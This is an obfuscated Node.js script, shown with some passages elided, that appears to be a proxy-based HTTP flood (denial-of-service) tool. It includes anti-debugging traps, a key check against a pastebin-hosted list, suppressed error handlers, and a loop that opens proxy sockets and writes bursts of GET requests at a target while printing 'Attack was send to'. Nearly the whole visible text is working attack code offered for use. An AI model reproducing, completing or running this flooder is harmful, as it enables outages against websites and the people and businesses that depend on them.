var _0x1ca5f3 = (function () {
    var _0x5173d2 = true
    return function (_0x4849f4, _0x2153fb) {
      var _0x371142 = _0x5173d2
        ? function () {
            if (_0x2153fb) {
              var _0x30e1e4 = _0x2153fb.apply(_0x4849f4, arguments)
              return (_0x2153fb = null), _0x30e1e4
            }
          }
        : function () {}
      return (_0x5173d2 = false), _0x371142
    }
  })(),
  _0x4962cc = _0x1ca5f3(this, function () {
    return _0x4962cc
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x4962cc)
      .search('(((.+)+)+)+$')
  })
_0x4962cc()
var _0x273910 = (function () {
  var _0x1cbf91 = true
  return function (_0x3a5fb6, _0x135046) {
    var _0x1c1045 = _0x1cbf91
      ? function () {
          if (_0x135046) {
            var _0x2b5781 = _0x135046.apply(_0x3a5fb6, arguments)
            return (_0x135046 = null), _0x2b5781
          }
        }
      : function () {}
    return (_0x1cbf91 = false), _0x1c1045
  }
})()
;(function () {
  _0x273910(this, function () {
    var _0x501705 = new RegExp('function *\\( *\\)'),
      _0x5cd4f5 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0x17a501 = _0x915bc4('init')
    if (
      !_0x501705.test(_0x17a501 + 'chain') ||
      !_0x5cd4f5.test(_0x17a501 + 'input')
    ) {
      _0x17a501('0')
    } else {
      _0x915bc4()
...
var request = require('request'),
  _0x3c1be1 = {}
_0x3c1be1.url = 'https://pastebin.com/raw/bw84mSCq'
opts = _0x3c1be1
;(function () {
  var _0x282375
  try {
    var _0x11cd20 = Function(
  ...
  _0x282375.setInterval(_0x915bc4, 4000)
})()
request.get(opts, function (_0x1db5e4, _0x277406, _0x4ba46b) {
  if (_0x4ba46b.includes(process.argv[5]) && process.argv[5].length > 14) {
    console.clear()
    console.log(
      '===================\nAttack was send to: ' +
        process.argv[2] +
...
process.on('uncaughtException', function (_0x1156dd) {})
process.on('unhandledRejection', function (_0x15708c) {})
const UAs = [
  'mkay was here/1.0',
...
var int = setInterval(() => {
  ...
  var _0x358ba0 = new net.Socket()
  _0x358ba0.setTimeout(10000)
  _0x358ba0.connect(proxy[1], proxy[0], function () {
    for (var _0x275718 = 0; _0x275718 < 50; _0x275718++) {
      _0x358ba0.write(
        'GET ' +
          target +
          ' HTTP/1.2\r\nHost: ' +
  ...
  _0x358ba0.on('data', function () {
    setTimeout(function () {
      return _0x358ba0.destroy(), delete _0x358ba0
    }, 5000)
  })
})
...
function _0x915bc4(_0x16d846) {
  function _0x4a69dc(_0x5f3f84) {
    if (typeof _0x5f3f84 === 'string') {
      return function (_0x4ba62d) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      if (('' + _0x5f3f84 / _0x5f3f84).length !== 1 || _0x5f3f84 % 20 === 0) {
        ;(function () {
          return true
        }
